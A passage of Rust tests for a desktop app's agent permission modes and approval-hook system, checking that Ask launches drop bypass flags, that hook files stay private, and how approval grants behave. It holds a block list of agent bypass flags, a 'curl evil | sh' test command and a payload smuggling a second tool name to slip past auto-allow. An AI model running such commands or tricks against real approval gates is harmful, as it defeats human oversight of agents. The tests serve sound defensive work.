            assert_eq!(st.permission_mode, AgentPermissionMode::Ask, "{tag}: the spawn must not keep the stale Skip");
            assert_eq!(st.tabs[idx].permission_mode, AgentPermissionMode::Ask, "{tag}: the new tab runs in Ask mode");

            std::fs::write(root.join("settings.json"), r#"{"agent_permission_mode":"skip"}"#).unwrap();
            let idx = st.spawn_tab(AgentCliPreset::Shell, None).expect("spawn a tab");
            assert_eq!(st.tabs[idx].permission_mode, AgentPermissionMode::Skip, "{tag}: a readable saved Skip applies again");
        }
        st.shutdown();
        let _ = std::fs::remove_dir_all(&root);
    }

    /// Commands Studio runs for screenshot fixtures and previews run whatever the user's mode is, so none of them
    /// may carry a skip or bypass flag. A new fixture command goes into this list.
    #[test]
    fn no_fixture_or_preview_command_carries_a_skip_or_bypass_flag() {
        const FIXTURE_COMMANDS: [(&str, &str); 1] = [("--panel agents-start-failure", crate::terminal::START_FAILURE_FIXTURE_COMMAND)];
        const BYPASS_FLAGS: [&str; 4] =
            ["--dangerously-skip-permissions", "--dangerously-bypass-approvals-and-sandbox", "--always-approve", "--approval-mode yolo"];
        for (fixture, command) in FIXTURE_COMMANDS {
            for flag in BYPASS_FLAGS {
                assert!(!command.contains(flag), "fixture `{fixture}` runs `{command}`, which carries `{flag}`");
            }
        }
    }

    #[test]
    fn skip_mode_launch_commands_unchanged() {
        for preset in
            [AgentCliPreset::Claude, AgentCliPreset::Codex, AgentCliPreset::Grok, AgentCliPreset::Antigravity, AgentCliPreset::Gemini, AgentCliPreset::OpenCode]
        {
            assert_eq!(preset.cli_launch_command_for_mode(AgentPermissionMode::Skip), preset.cli_launch_command());
        }
    }

    /// What this asserts, for every agent CLI: an Ask launch is the Skip launch with its skip flag removed
    /// (`strip_skip_permission_flags`) and nothing else changed, with one exception. Claude's `--mcp-config
    /// "$DESIGNOS_MCP_CONFIG" --settings "$DESIGNOS_SESSION_DIR/hooks.json"` (the MCP config and the hooks file in the
    /// session folder) becomes, in Ask mode, `--mcp-config "$DESIGNOS_CLAUDE_MCP_CONFIG" --settings
    /// "$DESIGNOS_CLAUDE_SETTINGS" --setting-sources user --plugin-dir "$DESIGNOS_CLAUDE_PLUGIN"` (the private MCP config and
    /// hooks file, only the user's own setting sources, Studio's skill from the private plugin). Put that one run of
    /// arguments back and the Ask string equals the stripped Skip string, byte for byte; the other CLIs have none of these
    /// flags and are identical to their stripped Skip string as they are.
    #[test]
    fn ask_mode_drops_each_skip_flag() {
        for preset in
            [AgentCliPreset::Claude, AgentCliPreset::Codex, AgentCliPreset::Grok, AgentCliPreset::Antigravity, AgentCliPreset::Gemini, AgentCliPreset::OpenCode]
        {
            let cmd = preset.cli_launch_command_for_mode(AgentPermissionMode::Ask);
            assert!(!cmd.contains("--dangerously-skip-permissions"), "{preset:?} ask command kept skip flag: {cmd}");
            assert!(!cmd.contains("--dangerously-bypass-approvals-and-sandbox"), "{preset:?} ask command kept bypass flag: {cmd}");
            assert!(!cmd.contains("--always-approve"), "{preset:?} ask command kept always-approve flag: {cmd}");
            assert!(!cmd.contains("--dangerously-bypass-hook-trust"), "{preset:?} ask command must never bypass hook trust: {cmd}");
            assert_eq!(cmd.replace(ASK_CLAUDE_CONFIG_ARGS, SKIP_CLAUDE_CONFIG_ARGS), strip_skip_permission_flags(preset.cli_launch_command()), "{preset:?}");
            assert_eq!(cmd, ask_mode_launch_command(preset.cli_launch_command()), "{preset:?}: the static Ask string is the derived one");
            // No Ask launch reads hooks, or starts MCP servers from a config, in the session folder.
            assert!(!cmd.contains("$DESIGNOS_SESSION_DIR/hooks.json"), "{preset:?} ask command reads hooks from the session folder: {cmd}");
            assert!(!cmd.contains("--mcp-config \"$DESIGNOS_MCP_CONFIG\""), "{preset:?} ask command names the session folder's MCP config: {cmd}");
            let claude = preset == AgentCliPreset::Claude;
            assert_eq!(cmd.contains(ASK_CLAUDE_CONFIG_ARGS), claude, "{preset:?}");
            assert_eq!(preset.cli_launch_command().contains(SKIP_CLAUDE_CONFIG_ARGS), claude, "{preset:?}");
        }
        // The two spellings are the ones the launch strings carry.
        assert_eq!(
            ASK_CLAUDE_CONFIG_ARGS,
            format!(
                "--mcp-config \"${CLAUDE_MCP_CONFIG_ENV}\" --settings \"${CLAUDE_SETTINGS_ENV}\" --setting-sources user --plugin-dir \"${CLAUDE_PLUGIN_ENV}\""
            )
        );
        // Only Claude's Ask launch restricts the setting sources, and none carries a flag that adds one back.
        for preset in
            [AgentCliPreset::Claude, AgentCliPreset::Codex, AgentCliPreset::Grok, AgentCliPreset::Antigravity, AgentCliPreset::Gemini, AgentCliPreset::OpenCode]
        {
            let cmd = preset.cli_launch_command_for_mode(AgentPermissionMode::Ask);
            assert_eq!(cmd.contains("--setting-sources user"), preset == AgentCliPreset::Claude, "{preset:?}");
            assert!(!cmd.contains("--add-dir") || preset == AgentCliPreset::Antigravity, "{preset:?} adds a folder: {cmd}");
        }
        assert!(AgentCliPreset::Claude.cli_launch_command_for_mode(AgentPermissionMode::Ask).starts_with("claude --mcp-config"));
        assert!(AgentCliPreset::Codex.cli_launch_command_for_mode(AgentPermissionMode::Ask).starts_with("codex -c"));
        assert!(AgentCliPreset::Grok.cli_launch_command_for_mode(AgentPermissionMode::Ask).starts_with("grok --cwd"));
        assert!(AgentCliPreset::Antigravity.cli_launch_command_for_mode(AgentPermissionMode::Ask).starts_with("agy --add-dir"));
    }

    #[test]
    fn claude_settings_value_is_the_private_hooks_file_or_inline_empty_settings() {
        let session = std::env::temp_dir().join("designos-sessions").join(format!("settings-value-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&session);
        assert_eq!(claude_settings_value(&session, AgentPermissionMode::Skip), None, "Skip mode names the session folder's file itself");

        // Ask mode before Studio has written the file: nothing to read, so Claude gets empty inline settings.
        assert_eq!(claude_settings_value(&session, AgentPermissionMode::Ask).as_deref(), Some("{}"));

        let channel = crate::agent_approval_channel::prepare_channel_dir(&session).unwrap();
        let hooks = channel.join(crate::agent_approval_channel::HOOKS_FILE_NAME);
        assert_eq!(claude_settings_value(&session, AgentPermissionMode::Ask).as_deref(), Some("{}"), "a folder without the file is not enough");
        crate::agent_approval_channel::write_owner_only_file(&hooks, b"{}", false).unwrap();
        let value = claude_settings_value(&session, AgentPermissionMode::Ask).expect("Ask mode has a value");
        assert_eq!(Path::new(&value), hooks);
        assert!(!Path::new(&value).starts_with(&session), "the file Claude reads sits outside the session folder");

        // No private folder at all: the file is not Claude's to read, whatever an earlier run left.
        let without = crate::agent_approval_channel::without_private_root(|| claude_settings_value(&session, AgentPermissionMode::Ask));
        assert_eq!(without.as_deref(), Some("{}"));
        crate::agent_approval_channel::remove_channel(&session);
    }

    #[test]
    fn claude_mcp_config_value_is_the_private_copy_or_inline_empty_servers() {
        let session = std::env::temp_dir().join("designos-sessions").join(format!("mcp-config-value-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&session);
        assert_eq!(claude_mcp_config_value(&session, AgentPermissionMode::Skip), None, "Skip mode names the session folder's file itself");

        // Ask mode before Studio has written the copy: no file to start servers from, so Claude gets no servers.
        assert_eq!(claude_mcp_config_value(&session, AgentPermissionMode::Ask).as_deref(), Some(NO_CLAUDE_MCP_CONFIG));

        let channel = crate::agent_approval_channel::prepare_channel_dir(&session).unwrap();
        let copy = channel.join(crate::agent_approval_channel::MCP_CONFIG_FILE_NAME);
        assert_eq!(
            claude_mcp_config_value(&session, AgentPermissionMode::Ask).as_deref(),
            Some(NO_CLAUDE_MCP_CONFIG),
            "a folder without the file is not enough"
        );
        // The session folder's own file is never the answer, whatever it holds.
        std::fs::create_dir_all(&session).unwrap();
        std::fs::write(session.join("mcp-config.json"), b"{}").unwrap();
        assert_eq!(claude_mcp_config_value(&session, AgentPermissionMode::Ask).as_deref(), Some(NO_CLAUDE_MCP_CONFIG));

        crate::agent_approval_channel::write_owner_only_file(&copy, b"{}", false).unwrap();
        let value = claude_mcp_config_value(&session, AgentPermissionMode::Ask).expect("Ask mode has a value");
        assert_eq!(Path::new(&value), copy);
        assert!(!Path::new(&value).starts_with(&session), "the file Claude starts servers from sits outside the session folder");

        // No private folder at all: the copy is not Claude's to read, whatever an earlier run left.
        let without = crate::agent_approval_channel::without_private_root(|| claude_mcp_config_value(&session, AgentPermissionMode::Ask));
        assert_eq!(without.as_deref(), Some(NO_CLAUDE_MCP_CONFIG));
        assert!(serde_json::from_str::<serde_json::Value>(NO_CLAUDE_MCP_CONFIG).unwrap()["mcpServers"].as_object().is_some_and(|servers| servers.is_empty()));
        crate::agent_approval_channel::remove_channel(&session);
        let _ = std::fs::remove_dir_all(&session);
    }

    #[test]
    fn claude_plugin_value_is_the_private_plugin_once_it_is_complete_and_never_empty() {
        let session = std::env::temp_dir().join("designos-sessions").join(format!("plugin-value-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&session);
        assert_eq!(claude_plugin_value(&session, AgentPermissionMode::Skip), None, "Skip mode names no plugin");
        assert_eq!(claude_plugin_value(&session, AgentPermissionMode::Ask).as_deref(), Some(NO_CLAUDE_PLUGIN_DIR), "no private folder yet");

        let channel = crate::agent_approval_channel::prepare_channel_dir(&session).unwrap();
        let plugin = channel.join(crate::agent_approval_channel::CLAUDE_PLUGIN_DIR_NAME);
        // A folder without its manifest is read as a folder of plugins and each child loads: it must not be handed out.
        std::fs::create_dir_all(plugin.join("skills/designos-studio")).unwrap();
        std::fs::write(plugin.join(CLAUDE_PLUGIN_SKILL_PATH), "skill").unwrap();
        assert_eq!(claude_plugin_value(&session, AgentPermissionMode::Ask).as_deref(), Some(NO_CLAUDE_PLUGIN_DIR));

        write_claude_plugin(&plugin, b"skill").unwrap();
        let value = claude_plugin_value(&session, AgentPermissionMode::Ask).expect("Ask mode has a value");
        assert_eq!(Path::new(&value), plugin, "the plugin folder itself, never the channel folder whose children are not plugins");
        assert!(!Path::new(&value).starts_with(&session));

        let without = crate::agent_approval_channel::without_private_root(|| claude_plugin_value(&session, AgentPermissionMode::Ask));
        assert_eq!(without.as_deref(), Some(NO_CLAUDE_PLUGIN_DIR));
        for value in [NO_CLAUDE_PLUGIN_DIR, NO_CLAUDE_SETTINGS] {
            assert!(!value.is_empty());
        }
        // The value that names nothing is an absolute path (`cfg(unix)`: Windows paths carry a drive) with nothing at it.
        assert!(!Path::new(NO_CLAUDE_PLUGIN_DIR).exists());
        crate::agent_approval_channel::remove_channel(&session);
    }

    #[test]
    fn the_private_plugin_holds_only_the_manifest_and_the_skill_and_is_owner_only() {
        let session = std::env::temp_dir().join("designos-sessions").join(format!("plugin-files-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&session);
        let channel = crate::agent_approval_channel::prepare_channel_dir(&session).unwrap();
        let plugin = channel.join(crate::agent_approval_channel::CLAUDE_PLUGIN_DIR_NAME);
        write_claude_plugin(&plugin, b"---\nname: designos-studio\n---\nrules").unwrap();
        write_claude_plugin(&plugin, b"---\nname: designos-studio\n---\nrules v2").unwrap();
        assert_eq!(
            std::fs::read_to_string(plugin.join(CLAUDE_PLUGIN_SKILL_PATH)).unwrap(),
            "---\nname: designos-studio\n---\nrules v2",
            "a sync rewrites the skill"
        );
        let manifest: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(plugin.join(CLAUDE_PLUGIN_MANIFEST_PATH)).unwrap()).unwrap();
        assert_eq!(manifest["name"], "designos-studio-session");
        // Paths are compared as paths, not as text: the constants spell their separators with `/`, a Windows path with `\`.
        let mut found: Vec<PathBuf> = Vec::new();
        let mut stack = vec![plugin.clone()];
        while let Some(dir) = stack.pop() {
            for entry in std::fs::read_dir(&dir).unwrap().flatten() {
                if entry.path().is_dir() {
                    stack.push(entry.path());
                } else {
                    found.push(entry.path().strip_prefix(&plugin).unwrap().to_path_buf());
                }
            }
        }
        found.sort();
        assert_eq!(
            found,
            [PathBuf::from(CLAUDE_PLUGIN_MANIFEST_PATH), PathBuf::from(CLAUDE_PLUGIN_SKILL_PATH)],
            "no .mcp.json, hooks/ or other file a plugin root is read for"
        );
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = |path: &Path| std::fs::metadata(path).unwrap().permissions().mode() & 0o777;
            assert_eq!(mode(&plugin), 0o700);
            assert_eq!(mode(&plugin.join(".claude-plugin")), 0o700);
            assert_eq!(mode(&plugin.join("skills/designos-studio")), 0o700);
            assert_eq!(mode(&plugin.join(CLAUDE_PLUGIN_SKILL_PATH)), 0o600);
            assert_eq!(mode(&plugin.join(CLAUDE_PLUGIN_MANIFEST_PATH)), 0o600);
        }
        crate::agent_approval_channel::remove_channel(&session);
    }

    /// A hooks file an earlier build wrote into the session folder in Ask mode names the approval hook, so it goes; one
    /// written in Skip mode names none and may still be read by a Skip tab that is running, so it stays.
    #[test]
    fn a_stale_session_hooks_json_goes_only_when_it_names_the_approval_hook() {
        let session = std::env::temp_dir().join("designos-sessions").join(format!("stale-hooks-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&session);
        std::fs::create_dir_all(&session).unwrap();
        let path = session.join("hooks.json");

        remove_stale_session_hooks(&session);
        assert!(!path.exists(), "nothing to remove is fine");

        let status_only = r#"{"hooks":{"PermissionRequest":[{"matcher":"*","hooks":[{"type":"command","command":"echo waiting"}]}]}}"#;
        std::fs::write(&path, status_only).unwrap();
        remove_stale_session_hooks(&session);
        assert_eq!(std::fs::read_to_string(&path).unwrap(), status_only, "a Skip-mode hooks file stays");

        let with_approval = r#"{"hooks":{"PermissionRequest":[{"matcher":"*","hooks":[{"type":"command","command":"sh '/x/approve-hook.sh'"}]}]}}"#;
        std::fs::write(&path, with_approval).unwrap();
        remove_stale_session_hooks(&session);
        assert!(!path.exists(), "a hooks file with the approval handler goes");
        let _ = std::fs::remove_dir_all(&session);
    }

    /// A Skip launch whose `--settings` is spelt some other way is not rewritten by the swap, so the Ask string would keep
    /// naming the session folder's file: debug builds stop at the source.
    #[cfg(debug_assertions)]
    #[test]
    #[should_panic(expected = "names a hooks file in the session folder")]
    fn an_ask_launch_that_still_names_the_session_hooks_file_is_caught_in_debug_builds() {
        ask_mode_launch_command("claude --always-approve --settings $DESIGNOS_SESSION_DIR/hooks.json --mcp-config x");
    }

    /// Same net for the MCP config: a Claude launch whose `--mcp-config` spelling the swap does not know would pass the
    /// session folder's file through to an Ask tab.
    #[cfg(debug_assertions)]
    #[test]
    #[should_panic(expected = "names the MCP config in the session folder")]
    fn an_ask_launch_that_still_names_the_session_mcp_config_is_caught_in_debug_builds() {
        ask_mode_launch_command("claude --always-approve --mcp-config $DESIGNOS_MCP_CONFIG --settings x");
    }

    #[test]
    fn the_approval_handler_names_an_absolute_sh_on_unix_and_sh_on_windows() {
        let handler = approval_hook_handler(Path::new("/chan/it's/approve-hook.sh"));
        let expected = if cfg!(windows) { "sh '/chan/it'\\''s/approve-hook.sh'" } else { "/bin/sh '/chan/it'\\''s/approve-hook.sh'" };
        assert_eq!(handler["command"].as_str(), Some(expected));
        assert_eq!(handler["timeout"].as_u64(), Some(APPROVAL_HOOK_TIMEOUT_SECS));
    }

    #[test]
    fn the_hook_script_puts_the_system_commands_first_on_path() {
        let script = approval_hook_script(Path::new("/chan"), Some(Path::new("/hooks/agent-status.json")), false);
        let first_command = script.lines().position(|line| line.starts_with("CHANNEL_DIR=")).expect("the script bakes in its folder");
        let pin = script.lines().position(|line| line == "PATH=\"/usr/bin:/bin${PATH:+:$PATH}\"");
        if cfg!(windows) {
            assert_eq!(pin, None, "the Git Bash script keeps its own PATH");
        } else {
            let pin = pin.expect("the script pins PATH");
            assert!(pin < first_command, "PATH is pinned before the first command runs");
            assert_eq!(script.lines().nth(pin + 1), Some("export PATH"));
            // Nothing runs before the pin but the builtins `set` and `umask`.
            let before: Vec<_> = script.lines().take(pin).filter(|line| !line.is_empty() && !line.starts_with('#')).collect();
            assert_eq!(before, ["set -eu", "umask 077"]);
        }
    }

    #[test]
    fn hook_script_allow_prints_the_documented_decision() {
        let fx = Fixture::new("allow");
        let child = fx.start(10_000, &bash_payload("cargo test -p designos-app"));
        let req = wait_for_request(&fx.tab_dir);
        assert_eq!((req.tool_name.as_str(), req.input_summary.as_str()), ("Bash", "cargo test -p designos-app"));
        write_approval_answer_in_dir(&fx.tab_dir, &req.id, ApprovalDecision::Allow).unwrap();

        let out = child.wait_with_output().unwrap();
        assert!(out.status.success());
        let parsed = decision_of(&out.stdout);
        assert_eq!(parsed["hookSpecificOutput"]["hookEventName"], "PermissionRequest");
        assert_eq!(parsed["hookSpecificOutput"]["decision"]["behavior"], "allow");
        assert!(
            poll_approvals_in_dir(&fx.tab_dir, crate::agent_sessions::unix_timestamp_secs(), APPROVAL_HOOK_TIMEOUT_SECS).is_empty(),
            "an answered request is gone"
        );
    }

    #[test]
    fn hook_script_deny_carries_a_message() {
        let fx = Fixture::new("deny");
        let payload = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "tool_name": "Write",
            "tool_input": { "file_path": "/etc/hosts", "content": "secret" }
        });
        let child = fx.start(10_000, &payload);
        let req = wait_for_request(&fx.tab_dir);
        write_approval_answer_in_dir(&fx.tab_dir, &req.id, ApprovalDecision::Deny).unwrap();

        let out = child.wait_with_output().unwrap();
        assert!(out.status.success());
        let parsed = decision_of(&out.stdout);
        assert_eq!(parsed["hookSpecificOutput"]["hookEventName"], "PermissionRequest");
        assert_eq!(parsed["hookSpecificOutput"]["decision"]["behavior"], "deny");
        assert!(!parsed["hookSpecificOutput"]["decision"]["message"].as_str().unwrap_or_default().is_empty());
    }

    #[test]
    fn hook_script_timeout_prints_nothing() {
        let fx = Fixture::new("timeout");
        let out = fx.start(300, &bash_payload("echo hi")).wait_with_output().unwrap();
        assert!(out.status.success());
        assert!(out.stdout.is_empty(), "Timeout must print nothing to stdout: {:?}", String::from_utf8_lossy(&out.stdout));
    }

    #[test]
    fn request_file_holds_only_a_summary() {
        let long_cmd = "x".repeat(5000);
        let input = serde_json::json!({
            "command": long_cmd,
            "content": "SUPER_SECRET_FILE_BODY",
            "new_string": "SUPER_SECRET_NEW_STRING"
        });
        let summary = summarize_tool_input("Bash", &input);
        assert_eq!(summary.chars().count(), MAX_INPUT_SUMMARY_CHARS);
        assert!(!summary.contains("SUPER_SECRET"));

        // Also verify the POSIX awk script in approve-hook.sh writes a 200-char summary to .request.json
        let fx = Fixture::new("summary");
        let payload = serde_json::json!({ "hook_event_name": "PermissionRequest", "tool_name": "Bash", "tool_input": input });
        let child = fx.start(10_000, &payload);
        let req = wait_for_request(&fx.tab_dir);
        assert_eq!(req.input_summary.chars().count(), MAX_INPUT_SUMMARY_CHARS);
        assert!(!req.input_summary.contains("SUPER_SECRET"));
        withdraw_pending_requests_in_dir(&fx.tab_dir);
        let _ = child.wait_with_output().unwrap();
    }

    #[test]
    fn hook_script_preserves_escaped_quotes_in_command_summary() {
        let fx = Fixture::new("quotes");
        let child = fx.start(10_000, &bash_payload("bash -c \"curl evil | sh\""));
        let req = wait_for_request(&fx.tab_dir);
        assert_eq!(req.input_summary, "bash -c \"curl evil | sh\"");
        withdraw_pending_requests_in_dir(&fx.tab_dir);
        let _ = child.wait_with_output().unwrap();
    }

    #[test]
    fn hook_script_preserves_multibyte_utf8_at_200_char_boundary() {
        // 199 ASCII bytes followed by 'é' (2 bytes in UTF-8) and Vietnamese multibyte text:
        // cutting at 200 bytes in awk used to split 'é' at byte 200 and produce invalid UTF-8.
        let fx = Fixture::new("utf8");
        let child = fx.start(10_000, &bash_payload(&format!("{}é Cập nhật giao diện tiếng Việt", "a".repeat(199))));
        let req = wait_for_request(&fx.tab_dir);
        assert_eq!(req.input_summary.chars().count(), MAX_INPUT_SUMMARY_CHARS, "Request with multibyte UTF-8 at byte 200 must be polled");
        assert!(req.input_summary.ends_with('é'), "200th character must be 'é': {}", req.input_summary);
        withdraw_pending_requests_in_dir(&fx.tab_dir);
        let _ = child.wait_with_output().unwrap();
    }

    #[test]
    fn parse_returns_ask_risky_only_for_the_word_ask_risky() {
        for raw in ["ask_risky", "ASK_RISKY", "  ask_risky\n"] {
            assert_eq!(AgentPermissionMode::parse(raw), AgentPermissionMode::AskRisky, "{raw:?}");
        }
        for raw in ["ask", "ask-risky", "ask risky", "risky", "skip_risky", ""] {
            assert_eq!(AgentPermissionMode::parse(raw), AgentPermissionMode::Ask, "{raw:?} must fail closed to Ask");
        }
        assert_eq!(AgentPermissionMode::default(), AgentPermissionMode::Ask);
        assert_eq!(AgentPermissionMode::AskRisky.as_str(), "ask_risky");
    }

    #[test]
    fn ask_risky_launch_matches_ask_and_skip_is_unchanged() {
        for preset in [AgentCliPreset::Claude, AgentCliPreset::Codex, AgentCliPreset::Grok, AgentCliPreset::Antigravity] {
            assert_eq!(
                preset.cli_launch_command_for_mode(AgentPermissionMode::AskRisky),
                preset.cli_launch_command_for_mode(AgentPermissionMode::Ask),
                "{preset:?}"
            );
            assert_eq!(preset.cli_launch_command_for_mode(AgentPermissionMode::Skip), preset.cli_launch_command());
            assert!(preset.permission_flags(AgentPermissionMode::AskRisky).is_empty(), "{preset:?}");
        }
        assert!(ask_risky_unsupported_reason(AgentCliPreset::Claude).is_none());
        for preset in [AgentCliPreset::Codex, AgentCliPreset::Grok, AgentCliPreset::Antigravity] {
            let reason = ask_risky_unsupported_reason(preset).expect("disabled with a reason");
            assert!(!reason.is_empty(), "{preset:?}");
        }
    }

    #[test]
    fn parse_answer_scope_defaults_to_once_and_rejects_a_bad_scope() {
        assert_eq!(parse_answer("allow"), Some(ParsedAnswer::Allow(AnswerScope::Once)));
        assert_eq!(parse_answer("allow once"), Some(ParsedAnswer::Allow(AnswerScope::Once)));
        assert_eq!(parse_answer("allow session"), Some(ParsedAnswer::Allow(AnswerScope::Session)));
        assert_eq!(parse_answer("deny"), Some(ParsedAnswer::Deny));
        assert_eq!(parse_answer("withdrawn"), Some(ParsedAnswer::Withdrawn));
        assert_eq!(parse_answer(r#"{"decision":"allow"}"#), Some(ParsedAnswer::Allow(AnswerScope::Once)));
        assert_eq!(parse_answer(r#"{"decision":"allow","scope":"session"}"#), Some(ParsedAnswer::Allow(AnswerScope::Session)));
        assert_eq!(parse_answer("allow nope"), None);
        assert_eq!(parse_answer("allow session extra"), None);
        assert_eq!(parse_answer(r#"{"decision":"allow","scope":"forever"}"#), None);
        assert_eq!(parse_answer(r#"{"decision":"allow","scope":1}"#), None);
        assert_eq!(parse_answer(""), None);
        assert_eq!(format_answer(ApprovalDecision::Allow, AnswerScope::Once), "allow");
        assert_eq!(format_answer(ApprovalDecision::Allow, AnswerScope::Session), "allow session");
    }

    #[test]
    fn ask_risky_gate_follows_the_tier_table() {
        assert_eq!(ask_risky_gate("designos_get_document", ""), ApprovalGate::Allow);
        assert_eq!(ask_risky_gate("mcp__designos__designos_create_node", ""), ApprovalGate::Allow);
        assert_eq!(ask_risky_gate("designos_update_node", "node_id:2"), ApprovalGate::Ask { session: true });
        assert_eq!(ask_risky_gate("mcp__designos__designos_update_node", "node_id:9"), ApprovalGate::Ask { session: true });
        assert_eq!(ask_risky_gate("designos_update_node", ""), ApprovalGate::Ask { session: false });
        assert_eq!(ask_risky_gate("designos_delete_node", "node_id:3"), ApprovalGate::Ask { session: false });
        assert_eq!(ask_risky_gate("designos_apply_batch", "node_id:1"), ApprovalGate::Ask { session: false });
        assert_eq!(ask_risky_gate("Bash", "command:rm"), ApprovalGate::Ask { session: false });
        assert_eq!(ask_risky_gate("mcp__designos__designos_not_a_tool", "node_id:1"), ApprovalGate::Ask { session: false });
        let batch = designos_mcp::risk::tool_risk("designos_apply_batch").unwrap().tier;
        let mixed = designos_mcp::risk::RiskTier::Read.strictest(designos_mcp::risk::RiskTier::Modify).strictest(designos_mcp::risk::RiskTier::Destructive);
        assert_eq!(batch, mixed);
    }

    #[test]
    fn generated_auto_allow_names_are_exactly_the_read_and_additive_rows() {
        let fx = Fixture::risky("names");
        let script = std::fs::read_to_string(&fx.script).unwrap();
        let safe = designos_mcp::risk::names_where_tier(|tier| matches!(tier, designos_mcp::risk::RiskTier::Read | designos_mcp::risk::RiskTier::Additive));
        assert!(!safe.is_empty());
        for name in &safe {
            assert!(script.contains(name), "{name} missing from the generated hook");
        }
        for name in designos_mcp::risk::names_where_tier(|tier| {
            matches!(tier, designos_mcp::risk::RiskTier::Modify | designos_mcp::risk::RiskTier::Destructive | designos_mcp::risk::RiskTier::External)
        }) {
            assert!(!script.contains(&format!("|{name}|")) && !script.contains(&format!("|{name})")), "{name} must not auto-allow");
        }
        assert!(script.contains("CHANNEL_DIR='") && script.contains("/dev/urandom") && script.contains("DESIGNOS_TAB_ID"));
        assert!(!script.contains("DESIGNOS_SESSION_DIR") && !script.contains("DESIGNOS_APPROVAL_REQUEST_ID") && !script.contains("DESIGNOS_APPROVALS_DIR"));
        assert_eq!(script.matches("\"behavior\":\"allow\"").count(), 2, "one auto-allow and one answer from the card");
        let first_allow = script.find("\"behavior\":\"allow\"").expect("auto-allow decision");
        let append_at = script.find(">> '").expect("private log append");
        assert!(append_at < first_allow, "a failed append must not reach the auto-allow decision");
        let ask_script = approval_hook_script(Path::new("/chan"), Some(Path::new("/hooks/agent-status.json")), false);
        assert_eq!(ask_script.matches("\"behavior\":\"allow\"").count(), 1);
        assert!(ask_script.contains("allow)"));
        assert!(!ask_script.contains("designos_get_document"));
        let bare = approval_hook_script(Path::new("/chan"), Some(Path::new("/hooks/agent-status.json")), true);
        assert!(!bare.contains("designos_get_document"), "no private log means no auto-allow block");
        assert_eq!(bare.matches("\"behavior\":\"allow\"").count(), 1);
    }

    #[test]
    fn grant_store_matches_one_target_expires_revokes_and_refuses_other_tiers() {
        let mut store = GrantStore::default();
        let now = 1_000_u64;
        assert!(store.insert("sess", "mcp__designos__designos_update_node", "node_id:2", now));
        assert!(store.matches("sess", "designos_update_node", "node_id:2", now + 10));
        assert!(!store.matches("sess", "designos_update_node", "node_id:3", now + 10), "a different target asks again");
        assert!(!store.insert("sess", "designos_delete_node", "node_id:3", now));
        assert!(!store.insert("sess", "designos_get_document", "node_id:1", now));
        assert!(!store.insert("sess", "Bash", "command:ls", now));
        assert!(!store.insert("sess", "designos_update_node", "", now));
        assert_eq!(store.list("sess", now + 10).len(), 1);
        assert!(store.revoke("sess", "designos_update_node", "node_id:2"));
        assert!(!store.matches("sess", "designos_update_node", "node_id:2", now + 11));
        assert!(store.insert("sess", "designos_update_node", "node_id:2", now));
        assert!(store.list("sess", now + GRANT_IDLE_TTL_SECS).len() == 1);
        assert!(store.list("sess", now + GRANT_IDLE_TTL_SECS + 1).is_empty(), "idle TTL clears the grant");
        assert!(store.insert("sess", "designos_update_node", "node_id:4", now));
        store.clear_session("sess");
        assert!(store.is_empty());
        let mut other_window = GrantStore::default();
        assert!(store.insert("sess", "designos_update_node", "node_id:4", now));
        assert!(!other_window.matches("sess", "designos_update_node", "node_id:4", now));
    }

    #[test]
    fn an_answer_file_cannot_create_a_grant() {
        let dir = std::env::temp_dir().join(format!("designos-1288-agent-answer-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let request = r#"{"id":"req-agent","tool_name":"designos_update_node","input_summary":"node_id:2","target":"node_id:2","timestamp":10}"#;
        std::fs::write(dir.join("req-agent.request.json"), request).unwrap();
        std::fs::write(dir.join("req-agent.answer"), "allow session").unwrap();
        let polled = poll_approvals_in_dir(&dir, 20, APPROVAL_HOOK_TIMEOUT_SECS);
        assert!(polled.is_empty(), "a request that already has an answer is not a card");
        let mut store = GrantStore::default();
        let mut pending = vec![ApprovalRequest {
            id: "req-agent".into(),
            tool_name: "designos_update_node".into(),
            input_summary: "node_id:2".into(),
            target: "node_id:2".into(),
            timestamp: 10,
        }];
        settle_granted_requests(&mut store, "sess", &dir, &mut pending, 20);
        assert!(pending.is_empty());
        assert!(store.is_empty(), "allow session on disk must not insert a grant");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn settle_writes_allow_for_a_matching_grant_and_leaves_a_different_target() {
        let dir = std::env::temp_dir().join(format!("designos-1288-settle-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let mut store = GrantStore::default();
        assert!(store.insert("sess", "designos_update_node", "node_id:2", 50));
        let mut pending = vec![
            ApprovalRequest {
                id: "same".into(),
                tool_name: "mcp__designos__designos_update_node".into(),
                input_summary: "rename".into(),
                target: "node_id:2".into(),
                timestamp: 50,
            },
            ApprovalRequest {
                id: "other".into(),
                tool_name: "designos_update_node".into(),
                input_summary: "rename".into(),
                target: "node_id:9".into(),
                timestamp: 51,
            },
        ];
        settle_granted_requests(&mut store, "sess", &dir, &mut pending, 60);
        assert_eq!(pending.len(), 1);
        assert_eq!(pending[0].id, "other");
        let answer = std::fs::read_to_string(dir.join("same.answer")).unwrap();
        assert_eq!(parse_answer(&answer), Some(ParsedAnswer::Allow(AnswerScope::Once)));
        assert!(store.matches("sess", "designos_update_node", "node_id:2", 61));
        remove_auto_allow_log(&auto_allow_session_key(&dir));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn hook_asks_when_the_payload_names_two_tools() {
        let fx = Fixture::risky("dup");
        let sneaky = r#"{"hook_event_name":"PermissionRequest","tool_name":"mcp__designos__designos_delete_node","tool_input":{"node_id":3,"x":{"tool_name":"designos_get_document"}}}"#;
        let child = fx.start_text(10_000, sneaky);
        let req = wait_for_request(&fx.tab_dir);
        assert_eq!(req.tool_name, "mcp__designos__designos_delete_node");
        withdraw_pending_requests_in_dir(&fx.tab_dir);
        let out = child.wait_with_output().unwrap();
        assert!(out.stdout.is_empty(), "two tool_name keys must not auto-allow: {}", String::from_utf8_lossy(&out.stdout));
    }

    #[test]
